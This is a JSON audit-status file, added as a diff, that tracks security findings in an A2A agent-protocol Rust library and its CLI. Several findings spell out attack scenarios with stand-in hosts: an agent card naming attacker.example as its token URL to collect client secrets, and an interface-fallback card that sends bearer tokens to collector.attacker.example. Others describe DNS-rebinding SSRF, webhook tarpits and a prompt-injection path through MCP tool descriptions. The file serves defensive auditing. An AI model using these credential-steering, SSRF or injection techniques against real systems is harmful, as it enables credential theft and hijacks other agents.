@@ -1,0 +1,252 @@
+{
+ "slice": "f",
+ "baseline": "4a8243c66df5ae07a54a69168ab419ac609b06e9",
+ "rows": [
+  {
+   "id": "SEC-08",
+   "verdict": "partly_fixed",
+   "severity_now": "medium (unchanged): the plaintext half is fixed, the card-steering half (an https tokenUrl on any host) is not",
+   "evidence": [
+    "commit 779ff31 - adds check_endpoint_secure and the discovery issuer check",
+    "crates/a2a-protocol-client/src/token_provider.rs:790-800 check_endpoint_secure: refuses http:// to a non-loopback host via loopback::is_plaintext_to_remote (crates/a2a-protocol-client/src/loopback.rs:34-43, which reads the host after userinfo)",
+    "crates/a2a-protocol-client/src/token_provider.rs:515 refresh() runs it before any connection; :418 from_agent_card runs it on the card's tokenUrl (no opt-out); :686 discovery URL (no opt-out); :724 + :734-744 check_issuer (OIDC Discovery 4.3)",
+    "crates/a2a-protocol-client/src/token_provider/exchange.rs:305 TokenExchange::exchange runs the same check (subject/actor token)",
+    "crates/a2a-protocol-client/src/token_provider.rs:418-419 from_agent_card: any https:// tokenUrl, on any host, is accepted and later receives Authorization: Basic base64(id:secret) (build_token_request :592-602). No allowlist, no binding to the card's origin, no signed-card requirement",
+    "book/src/building-agents/authentication/oauth-client-credentials.md:35-47 still recommends from_agent_card with no warning that the card chooses where the secret goes"
+   ],
+   "test": "token_provider.rs:968 a_plaintext_token_endpoint_on_another_machine_is_refused (fails if the check returns Ok); :1016 a_provider_aimed_at_a_plaintext_remote_endpoint_sends_nothing (without the check refresh() dials 198.51.100.1 and returns HttpClient/Timeout, not InvalidEndpoint, so it fails); :1037 a_card_that_names_a_plaintext_remote_token_url_is_refused; :1076/:1092 wrong or missing issuer; :1122 plaintext discovery; exchange/tests.rs:212 an_exchange_aimed_at_a_plaintext_remote_endpoint_sends_nothing. All read, not run; each would fail with its check reverted. No test covers an https tokenUrl on a foreign host, because that is still accepted.",
+   "summary": "A plaintext token endpoint, card tokenUrl, exchange endpoint or discovery URL to a remote host is now refused before connecting, and discovery binds the document to its issuer. A card (malicious peer, or any card fetched over http:// and altered) that names https://attacker.example/token still receives the client id and secret on the first refresh.",
+   "remaining": "Card-controlled https tokenUrl (the report's first exploit). Options: (a) from_agent_card takes the caller's expected token host(s)/issuer and refuses others; (b) trust tokenUrl only from a card verified with ClientBuilder::from_signed_card keys; (c) at minimum a rustdoc and book warning that from_agent_card hands the secret to whatever host the card names. Recommend (a) plus (c).",
+   "theme": "client-credentials",
+   "effort": "S",
+   "breaking": "api if (a) changes from_agent_card's signature; none if added as a new constructor and the old one deprecated",
+   "probe": "none"
+  },
+  {
+   "id": "SEC-09",
+   "verdict": "partly_fixed",
+   "severity_now": "medium (unchanged): the new host check can be bypassed by a hostile card through the builder's interface fallback",
+   "evidence": [
+    "commit 779ff31 - resolve_target host check, card verify JWK Set rule, --follow-card-origin",
+    "tools/a2a-cli/src/connect.rs:152-157 refuses when --header is set and the CHOSEN interface (builder.chosen_interface(), :143) is on another host than the typed URL; host_of :90-104 reads the host after the last '@'",
+    "tools/a2a-cli/src/offline.rs:66-87 card verify keeps --header from a JWK Set on another host unless --follow-card-origin",
+    "BYPASS (read only): tools/a2a-cli/src/connect.rs:216 calls builder.build(), and crates/a2a-protocol-client/src/builder/transport_factory.rs:67-69 falls back on any build error to the card's next interface (fall_back :133-168 sets self.endpoint = iface.url at :155). fallback_interfaces is every remaining compatible interface (builder/mod.rs:261; selection.rs:79-113 filters only by protocolVersion, so an unknown binding stays a candidate). A card [{url:https://partner.example/, protocolBinding:'NOPE', protocolVersion:'1.0'}, {url:https://collector.attacker.example/, protocolBinding:'JSONRPC', protocolVersion:'1.0'}] passes the check (first interface is the typed host) and the HeaderInterceptor then sends --header to the attacker on every call. A malformed first URL on the typed host does the same.",
+    "tools/a2a-cli/src/cli.rs:75-79,148-160 --header is argv only: no env or file source, so tokens stay visible in ps and shell history (report fix 3, not done)",
+    "crates/a2a-protocol-client/src/builder/mod.rs:171-275 library from_card/from_card_preferring still has no origin check; any credential interceptor (BearerAuthInterceptor, AuthInterceptor) follows the card's interface and its fallbacks (report's 'Where' cites builder/mod.rs:215-240)"
+   ],
+   "test": "tools/a2a-cli/tests/e2e/card_origin.rs: a_header_is_not_sent_to_a_host_the_card_names (asserts server B saw nothing; would fail with the check removed), the_flag_sends_it_where_the_card_says, without_a_header_the_card_is_followed_as_before, and five card verify tests (a_header_is_not_sent_to_a_jwk_set_on_another_host_than_the_card etc.). Read, not run. The card used (tests/e2e/main.rs:48-57 card_for / card_for(b)) lists interfaces on one host only, so the fallback bypass is untested. connect.rs:233 same_host unit test.",
+   "summary": "The CLI now refuses --header when the card's chosen interface is on another host, and keeps --header from a JWK Set on another host. The check looks only at the first interface, and build() falls back to later interfaces, so a card can still steer the header to another host; the library's from_card has no such guard at all.",
+   "remaining": "(1) Close the fallback bypass: in resolve_target either check the host of every candidate (or refuse when any differs), or pin the chosen interface (with_protocol_binding clears fallbacks, builder/mod.rs:437) when --header is set; add an e2e test with a two-interface card. (2) --header-from-env / --header @file. (3) Library: an opt-in ClientBuilder guard (credentials only to the card's origin or an allowlist) and a rustdoc warning on from_card. (4) CHANGELOG.md:474-475 says the card verify half has no test; card_origin.rs has five.",
+   "theme": "cli-credentials",
+   "effort": "S",
+   "breaking": "behaviour: with --header set, a card whose first interface cannot be built and whose next one is on another host now fails instead of falling back",
+   "probe": "Settled by reading, but proving the fix needs a run: an e2e test in tools/a2a-cli/tests/e2e/card_origin.rs where server A (localhost) serves a card listing [{protocolBinding:'NOPE', url:http://localhost:<A>/}, {JSONRPC, url:http://127.0.0.1:<B>/}] and `a2a --header Authorization=Bearer s3cret send http://localhost:<A> hi` is run; today B records 'Bearer s3cret' (expected after fix: exit 1, B records nothing). No external services."
+  },
+  {
+   "id": "SEC-11",
+   "verdict": "already_fixed",
+   "severity_now": "info (was low)",
+   "evidence": [
+    "commit 5b45b97 - default bearer-token tenant is a digest",
+    "crates/a2a-protocol-server/src/tenant_resolver.rs:192-202 tenant_id_for_token = 'sha256:' + first 16 bytes of SHA-256 as hex",
+    "crates/a2a-protocol-server/src/tenant_resolver.rs:298-300 resolve() uses it when no mapper; :240 Default derived; :256-265 new() deprecated",
+    "crates/a2a-protocol-server/src/tenant_resolver.rs:206-224 rustdoc: default is for tests, unverified, no isolation; migration note"
+   ],
+   "test": "crates/a2a-protocol-server/src/tenant_resolver/tests.rs:40 bearer_resolver_names_the_token_by_its_digest_not_by_the_token asserts the exact digest and that the tenant does not contain the token (would fail if the raw token were returned); :73 known-answer vectors; :54 new()==default(). Read, not run.",
+   "summary": "Default/new() now resolve to an unsalted, truncated SHA-256 of the token, so the bearer secret no longer lands in task rows, telemetry or the audit chain. It still verifies nothing (documented); with_mapper remains the deployment path.",
+   "remaining": "",
+   "theme": "tenant",
+   "effort": "XS",
+   "breaking": "behaviour (already shipped in [Unreleased]): tasks stored under a raw-token tenant are not found under the digest",
+   "probe": "none"
+  },
+  {
+   "id": "SEC-12",
+   "verdict": "already_fixed",
+   "severity_now": "info (was low)",
+   "evidence": [
+    "commit 8bdf383 - refuse the addresses and names the SSRF check let through",
+    "crates/a2a-protocol-server/src/url_guard.rs:250 strips one trailing dot before every test (localhost., 169.254.169.254., metadata.google.internal.)",
+    "crates/a2a-protocol-server/src/url_guard.rs:282-312 check_name: *.localhost, .local, .internal, .home.arpa, empty labels, single-label names (metadata, kubernetes) refused; only for hosts that are not an address in any form",
+    "crates/a2a-protocol-server/src/url_guard.rs:73-83 IPv4 adds 0/8, 192.0.0.0/24, 198.18/15, >=224 (multicast, 240/4, broadcast)",
+    "crates/a2a-protocol-server/src/url_guard.rs:184-216 IPv6 adds fec0::/10, ff00::/8, 64:ff9b:1::/48, 2001::/32, 100::/64; 6to4/NAT64/mapped/compatible classified by the IPv4 inside (:163-180)",
+    "crates/a2a-protocol-server/src/url_guard.rs:98-152 inet_aton numeric forms (decimal, hex, octal, packed) still judged by address",
+    "http 1.5.0 authority parser rejects '%' outside userinfo (~/.cargo/registry/src/*/http-1.5.0/src/uri/authority.rs:503-565), so a percent-encoded host (which the url crate/reqwest would decode) cannot reach check() - checked by reading the dependency",
+    "crates/a2a-protocol-server/src/builder.rs:1007-1019 refuse_private_file_urls documents that it is a static check and that the agent must connect through resolve_public_url (the report's 'no delivery-time counterpart' is by design and documented)"
+   ],
+   "test": "crates/a2a-protocol-server/src/url_guard/tests.rs: every_ipv4_special_use_range_is_refused_at_both_of_its_edges, the_address_beside_each_ipv4_range_is_a_public_one, every_ipv6_special_use_range_is_refused, a_trailing_dot_does_not_hide_an_address_or_a_name, reserved_and_internal_names_are_refused, a_numeric_host_is_judged_by_the_address_it_denotes_not_as_a_name. Boundary-on-both-sides tests; each of the report's example URLs (localhost., a.localhost, 198.18.0.1, [fec0::1]) is asserted refused, so reverting fails them. Read, not run.",
+   "summary": "Every URL and range the report lists is now refused by check_public_url, with edge tests on both sides of each range. The static check still cannot know what a multi-label name resolves to (documented), see NEW-f-4.",
+   "remaining": "",
+   "theme": "ssrf-guard",
+   "effort": "XS",
+   "breaking": "behaviour (already shipped): a webhook to a bare host name such as http://receiver/ is refused",
+   "probe": "none"
+  },
+  {
+   "id": "SEC-13",
+   "verdict": "needs_decision",
+   "severity_now": "low (unchanged); KNOWN",
+   "evidence": [
+    "crates/a2a-protocol-server/src/push/sender.rs:584-603 validates via DNS, then pins only http:// (pinning.rs:76-84 pin_target returns None for https); the https request is built from the original URL (:651-653) and the connector resolves again",
+    "crates/a2a-protocol-server/src/push/sender.rs:226-236 rustdoc states the trade-off (TLS defeats a rebind) but not the blind TCP connect + ClientHello the report describes",
+    "commit c4404e8 - push delivery now goes through HTTPS_PROXY/HTTP_PROXY (sender.rs:44-51, net/client.rs:35-75): for https the proxy is sent CONNECT host:port and resolves the name itself, so the agent's pre-flight check is advisory and the rebinding connection originates from the proxy's network position (read only)"
+   ],
+   "test": "none for the defect (no https pinning exists); the report's suggested injected-resolver test is absent",
+   "summary": "Unchanged: https webhooks are validated by one lookup and connected by another, so a rebinding name still gets a TCP connection and ClientHello to an internal address:port (blind scan). Since c4404e8 a proxied https delivery is resolved by the proxy, which widens the same gap.",
+   "remaining": "Pin https for direct connections; decide what the SSRF boundary is when a proxy is configured.",
+   "theme": "push-ssrf",
+   "effort": "M",
+   "breaking": "none for (a); behaviour for (b) (proxies that filter CONNECT by domain refuse an IP literal)",
+   "probe": "Live: a rebinding DNS server (e.g. a small authoritative server answering a public IP first and 127.0.0.1/10.x afterwards, TTL 0) plus a listener on the private address; register https://rebind.<zone>:<port>/ and send an event; observe whether the private listener accepts a TCP connection/ClientHello. Repeat with HTTPS_PROXY set to a Squid on another host to see the proxy-side connect.",
+   "options": "(a) Direct connections: dial the validated SocketAddr for https too, with a per-request resolver override (hyper-util HttpConnector::new_with_resolver returning the pinned address for that host) so SNI and certificate checks still use the hostname; through a proxy, document that the proxy is the SSRF boundary and must enforce its own destination ACL. (b) Also pin through the proxy by sending CONNECT <ip>:<port> with SNI=hostname (breaks proxies that allow by domain). (c) Keep as is and expand the rustdoc to name the blind-connect residue and the proxy case. Recommend (a)."
+  },
+  {
+   "id": "SEC-14",
+   "verdict": "partly_fixed",
+   "severity_now": "low (unchanged): bounded, but no per-caller quota or rate, and the bound itself can be monopolised",
+   "evidence": [
+    "commit ee0a4c4 - PushGate: push_max_in_flight (512) and push_max_in_flight_per_host (64)",
+    "crates/a2a-protocol-server/src/push/gate.rs:170-181 every delivery takes a per-destination then an overall permit; builder.rs:1507-1509 wraps every sender (custom included) outermost",
+    "crates/a2a-protocol-server/src/handler/limits/mod.rs:156,172 and defaults :356-357; :163-164 says plainly it is 'not a rate limit'",
+    "crates/a2a-protocol-server/src/push/gate.rs:207-218 destination = host:port by name; different names resolving to one victim IP (wildcard DNS) are different destinations, so only the overall 512 bounds a victim",
+    "crates/a2a-protocol-server/src/handler/limits/mod.rs:212,231,361,363 max_push_configs_per_task 100 and max_total_push_configs 100,000 are not per caller: one anonymous caller can fill the global table and nobody else can register a webhook",
+    "no verification handshake for new webhook URLs (grep for any challenge/verification in push/: none)"
+   ],
+   "test": "crates/a2a-protocol-server/src/push/gate/tests.rs:196 at_most_the_overall_bound_run_at_once_and_all_are_delivered, :205 at_most_the_per_host_bound..., :233 a_saturated_destination_does_not_hold_overall_permits_while_it_waits; tests/handler_conformance/push_gate.rs:100 a_handler_delivers_to_every_webhook_but_never_beyond_its_bound (and :111 the unbounded control). These would fail if the gate or its wiring were removed. Read, not run.",
+   "summary": "Outbound webhook concurrency is now bounded per destination and overall, in front of any sender. There is still no per-caller quota, no per-destination rate, no URL verification, the per-destination key is a name, and one caller can occupy all 512 overall permits (NEW-f-2).",
+   "remaining": "Per-caller (identity/tenant) config quota; per-destination delivery rate (token bucket), keyed on the resolved address rather than the name; optional webhook verification handshake; fairness between callers in the overall gate (NEW-f-2).",
+   "theme": "push-amplification",
+   "effort": "M",
+   "breaking": "behaviour: new quotas refuse configs that are accepted today",
+   "probe": "In-process or live: one task with 100 configs to a tarpit listener (accepts TCP, never answers) on 8 ports, plus one legitimate config on a fast receiver; emit events and read push_outcome metrics: today the legitimate delivery reports timeout once the 512 permits are held (NEW-f-2)."
+  },
+  {
+   "id": "SEC-15",
+   "verdict": "confirmed",
+   "severity_now": "low (unchanged; example on loopback ephemeral ports, and SEC-01/02 now make a browser path harder)",
+   "evidence": [
+    "examples/agent-team/src/executors/health_monitor.rs:38-55 URLs taken from a caller's Data part, unbounded count",
+    "examples/agent-team/src/executors/health_monitor.rs:89-130 resolve_agent_card(url) and ClientBuilder::new(url).list_tasks for each, no url_guard, result HEALTHY/DEGRADED/UNREACHABLE reflected into the artifact",
+    "git log -- examples/agent-team/src/executors/health_monitor.rs: last change 2ce522a, before the audit"
+   ],
+   "test": "none",
+   "summary": "Unchanged: any caller can make the health monitor GET/POST arbitrary URLs and learn reachability per URL.",
+   "remaining": "Restrict to the configured roster (Coordinator already knows agent_urls) or screen each URL with url_guard::resolve_public_url and cap the count.",
+   "theme": "examples-security",
+   "effort": "XS",
+   "breaking": "none",
+   "probe": "none"
+  },
+  {
+   "id": "SEC-16",
+   "verdict": "confirmed",
+   "severity_now": "low (unchanged, example)",
+   "evidence": [
+    "examples/mcp-bridge/src/mapping.rs:116-130 skill.description, skill.id and card.name copied verbatim into the MCP tool description; tool.title = skill.name",
+    "examples/mcp-bridge/src/mapping.rs:137-145 the description is embedded again in the input-schema description",
+    "examples/mcp-bridge/src/mapping.rs:180-203 artifact and status text returned to the MCP host verbatim (indirect injection path, inherent to bridging)",
+    "examples/mcp-bridge/src/bridge.rs:124-131 card fetched once at startup, no https requirement; examples/mcp-bridge/README.md:25 still shows http://agent.internal:8080"
+   ],
+   "test": "none",
+   "summary": "Unchanged: a hostile or MITM'd card writes the MCP host model's tool descriptions, and the one-string 'message' argument is a ready exfiltration channel to that same agent.",
+   "remaining": "Length-cap and quote the remote text (e.g. 'Remote agent says: \"...\"'), strip control/bidi characters, warn or refuse http:// outside loopback, and say in the README that the remote card is untrusted input to the host model.",
+   "theme": "examples-security",
+   "effort": "S",
+   "breaking": "none",
+   "probe": "none"
+  },
+  {
+   "id": "SEC-17",
+   "verdict": "needs_decision",
+   "severity_now": "info (unchanged)",
+   "evidence": [
+    "crates/a2a-protocol-server/src/handler/event_processing/background/push_delivery/mod.rs:232-235 calls sender.send(&config.url, ..) with no handler-side resolve",
+    "crates/a2a-protocol-server/src/handler/push_config.rs:515-516 only the static check at creation, and only when !allows_private_urls()",
+    "crates/a2a-protocol-server/src/push/sender.rs:66-132 PushSender trait rustdoc says nothing about SSRF or redirects",
+    "book/src/building-agents/push-notifications/custom-sender.md:37-43 does say a custom sender must screen with resolve_public_url (present since 7c10524, before the audit), but not that it must not follow redirects",
+    "since ee0a4c4 a custom sender is at least bounded by PushGate (builder.rs:1507-1509)"
+   ],
+   "test": "none",
+   "summary": "A custom PushSender (e.g. reqwest, which follows redirects and re-resolves) still gets only the creation-time static check; the requirement is in the book but not on the trait.",
+   "remaining": "Decide where the delivery-time guard lives; at least document the redirect requirement on the trait.",
+   "theme": "push-ssrf",
+   "effort": "S",
+   "breaking": "none for (a)/(c); api for (b)",
+   "probe": "none",
+   "options": "(a) Handler runs url_guard::resolve_public_url before send() unless allows_private_urls(), skipped for senders that declare they screen themselves (new trait method, default false; HttpPushSender returns true to avoid a second lookup) - catches a name resolving inward but not a redirect or the sender's own re-resolution. (b) Pass the validated SocketAddr into send() (breaking trait change) so a sender can pin. (c) Rustdoc on the trait: screen with resolve_public_url, connect to the returned address, never follow redirects. Recommend (c) now and (a)."
+  },
+  {
+   "id": "SEC-18",
+   "verdict": "partly_fixed",
+   "severity_now": "info (unchanged)",
+   "evidence": [
+    "(a) constant_time_eq: crates/a2a-protocol-server/src/auth/mod.rs:103-112 still a plain XOR-OR loop with no black_box/subtle; the client copy crates/a2a-protocol-client/src/webhook/token.rs:83-92 is the same. Open.",
+    "(b1) crit: commit 779ff31; crates/a2a-protocol-server/src/auth/jwt.rs:516-518 refuses any token whose header has a crit member; JwtHeader :672-680. Fixed. ('crit': null deserialises to None and is accepted, harmless.)",
+    "(b2) typ: crates/a2a-protocol-server/src/auth/jwt.rs:672-680 JwtHeader has no typ field; typ is still ignored (no explicit typing per RFC 8725 3.11 / RFC 9068 at+jwt). Open; lower risk now that iss and aud are required by default (SEC-06)."
+   ],
+   "test": "crates/a2a-protocol-server/src/auth/jwt.rs:1853 a_token_that_marks_an_extension_critical_is_refused: positive control (same token without crit accepted) plus four crit shapes refused; fails if the check is removed. Read, not run. Nothing for (a) beyond functional equality tests (auth/tests.rs:20), nothing for typ.",
+   "summary": "The JWT validator now refuses a crit header. constant_time_eq is still an unguarded loop and typ is still ignored.",
+   "remaining": "(a) use subtle::ConstantTimeEq or wrap the accumulator in std::hint::black_box, in both copies; (b2) optional JwtValidator::with_required_typ (e.g. at+jwt).",
+   "theme": "auth-hardening",
+   "effort": "XS",
+   "breaking": "none (typ check opt-in)",
+   "probe": "none"
+  }
+ ],
+ "new_findings": [
+  {
+   "id": "NEW-f-1",
+   "severity": "medium",
+   "where": "tools/a2a-cli/src/connect.rs:142-157,216; crates/a2a-protocol-client/src/builder/transport_factory.rs:67-69,133-168; crates/a2a-protocol-client/src/builder/mod.rs:261",
+   "finding": "The SEC-09 fix checks only the card's first (chosen) interface, but ClientBuilder::build() falls back to the card's later interfaces when the first cannot be built (unknown binding, malformed URL). The fallback moves the endpoint to another host and the --header interceptor goes with it.",
+   "scenario": "a2a --header 'Authorization=Bearer $PROD' send https://partner.example hi; partner's card (hostile, or fetched over http:// and altered) lists {protocolBinding:'NOPE', url:https://partner.example/} then {JSONRPC, url:https://collector.attacker.example/}. The host check passes, build() fails the first, falls back, and every call carries the bearer to the attacker.",
+   "read_only": true,
+   "theme": "cli-credentials"
+  },
+  {
+   "id": "NEW-f-2",
+   "severity": "low",
+   "where": "crates/a2a-protocol-server/src/push/gate.rs:170-181,207-218; crates/a2a-protocol-server/src/handler/limits/mod.rs:146-148,356-357",
+   "finding": "The overall push gate (512) has no fairness between callers or tenants, and a delivery's wait for a permit counts against push_delivery_timeout. One caller can hold all 512 permits with slow destinations (64 per host:port, so 8 ports on one tarpit host suffice), and every other tenant's webhook deliveries queue behind them and end as 'timeout' without being attempted.",
+   "scenario": "Anonymous (or any authenticated) caller: 6 tasks x 100 push configs to http(s)://tarpit.example:1..8/ that accept TCP and never answer, one SendMessage per task every ~30 s. Legitimate webhooks in the same process stop being delivered. Before ee0a4c4 the same load opened 600 sockets instead (fd pressure), so this is a residual, not a regression.",
+   "read_only": true,
+   "theme": "push-amplification"
+  },
+  {
+   "id": "NEW-f-3",
+   "severity": "medium",
+   "where": "crates/a2a-protocol-server/src/push/sender.rs:44-51,584-588; crates/a2a-protocol-server/src/url_guard.rs:354-363; crates/a2a-protocol-server/tests/outbound_proxy_and_roots.rs:255",
+   "finding": "Since c4404e8 push delivery honours HTTPS_PROXY, but the SSRF pre-flight still resolves the webhook host with the local resolver (tokio::net::lookup_host) and refuses delivery if that fails. In a proxy-only egress deployment whose DNS resolves only internal names, every webhook to a public host fails with 'hostname could not be resolved'; the only switch that delivers is allow_private_urls(), which turns all SSRF checks off. Conversely, where local DNS does resolve, the proxy resolves again for https (SEC-13). The proxy test passes only because it uses allow_private_urls().",
+   "scenario": "Kubernetes or corporate network with HTTPS_PROXY=http://egress:3128 and cluster DNS that does not forward external names: N-B-1 (webhooks not delivered behind a proxy) remains true for every SSRF-checked webhook.",
+   "read_only": true,
+   "theme": "push-ssrf"
+  },
+  {
+   "id": "NEW-f-4",
+   "severity": "low",
+   "where": "crates/a2a-protocol-server/src/url_guard.rs:282-312 (check_name), :73-83 and :184-216 (deny-list)",
+   "finding": "The deny-list approach cannot see an operator's own address plan. Multi-label names resolved through Kubernetes search domains (ndots:5: kubernetes.default, redis.prod, svc.ns.svc) pass the static check; HttpPushSender's resolve then catches them only if the cluster uses RFC 1918/CGNAT ranges. A cluster whose Service or Pod range is privately used public space (I recall GKE Autopilot defaulting Services to 34.118.224.0/20 - from memory, not verified here) passes both checks, and refuse_private_file_urls, which is static only, passes such names everywhere.",
+   "scenario": "Agent in such a cluster with push enabled: a caller registers http://internal-admin.default/ (or http://kubernetes.default/) and receives task events' side effects there; HttpPushSender's delivery-time check sees a public address and delivers.",
+   "read_only": true,
+   "theme": "ssrf-guard"
+  },
+  {
+   "id": "NEW-f-5",
+   "severity": "info",
+   "where": "tools/a2a-cli/src/error.rs:82-94 (plain), commands' stdout via serde_json",
+   "finding": "N-SEC-4's escaping uses char::is_control (Unicode Cc). Bidi controls (U+202A-202E, U+2066-2069) pass on stderr, and stdout's 'already escaped by serde_json' holds only for C0: serde_json does not escape DEL or C1 (U+0080-U+009F, including CSI U+009B). An agent's text can still reorder what the terminal shows, and on a terminal that honours UTF-8-encoded C1 controls, drive it.",
+   "scenario": "A hostile agent returns an artifact or error containing U+202E or U+009B; the operator's terminal shows a spoofed line. Terminal-dependent; not run.",
+   "read_only": true,
+   "theme": "cli-credentials"
+  },
+  {
+   "id": "NEW-f-6",
+   "severity": "info",
+   "where": "crates/a2a-protocol-server/src/tenant_resolver.rs:235-238; CHANGELOG.md:474-475; examples/mcp-bridge/README.md:25",
+   "finding": "Documentation that contradicts the fixes: the BearerTokenTenantResolver::with_mapper example returns format!(\"tenant-for-{token}\"), i.e. the raw credential in the tenant, which SEC-11 just removed from the default; CHANGELOG says the card verify half of SEC-09 has no test, but tools/a2a-cli/tests/e2e/card_origin.rs has five; the mcp-bridge README's first example uses plaintext http://agent.internal:8080.",
+   "scenario": "A reader copies the mapper example and stores bearer tokens in task rows, telemetry and the audit chain again.",
+   "read_only": true,
+   "theme": "docs"
+  }
+ ]
+}
